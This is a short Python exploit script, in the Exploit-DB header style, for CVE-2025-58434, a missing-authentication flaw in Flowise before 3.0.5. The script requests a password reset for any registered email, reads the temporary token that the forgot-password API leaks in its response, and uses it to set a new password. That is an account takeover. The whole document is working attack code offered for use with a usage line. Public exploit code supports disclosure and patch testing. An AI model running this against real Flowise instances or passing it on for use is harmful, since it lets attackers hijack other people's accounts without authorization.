# Exploit Title: Flowise < 3.0.5 - Missing Authentication for Critical Function
# Date: 10/11/2025
# Exploit Author: [nltt0] (https://github.com/nltt-br))
# Vendor Homepage: https://flowiseai.com/
# Software Link: https://github.com/FlowiseAI/Flowise
# Version: < 3.0.5
# CVE: CVE-2025-58434

from requests import post
from argparse import ArgumentParser

banner = r"""
_____       _                              _____
/  __ \     | |                            /  ___|
| /  \/ __ _| | __ _ _ __   __ _  ___  ___ \ `--.
| |    / _` | |/ _` | '_ \ / _` |/ _ \/ __| `--. \
| \__/\ (_| | | (_| | | | | (_| | (_) \__ \/\__/ /
\____/\__,_|_|\__,_|_| |_|\__, |\___/|___/\____/
                            __/ |
                          |___/

                by nltt0
"""

print(banner)

try:
    parser = ArgumentParser(description='CVE-2025-58434 [FlowiseAI < 3.0.5]', usage="python CVE-2025-58434.py --email xtz@local --newpassword Test@2025 --url http://localhost:3000")
    parser.add_argument('-e', '--email', required=True, help='Registered email')
    parser.add_argument('-p', '--newpassword', required=True)
    parser.add_argument('-u', '--url', required=True)

    args = parser.parse_args()
    email = args.email
    password = args.newpassword
    url = args.url

    headers = {
        'Content-Type': 'application/json'
    }

    data = {
        'user': {'email': email}
    }

    url_format1 = '{}/api/v1/account/forgot-password'.format(url)
    req = post(url_format1, headers=headers, json=data)

    if req.status_code == 201:
        req_json = req.json()
        temp_token = req_json['user']['tempToken']

        data = {
            'user': {'email': email,
                    'tempToken': temp_token,
                    "password": password
                    }
        }
        url_format2 = '{}/api/v1/account/reset-password'.format(url)
        req = post(url_format2, headers=headers, json=data)
        print('[x] Password changed')

    else:
        print('[x] Unregistered user')

except Exception as e:
    print('Error in {}'.format(e))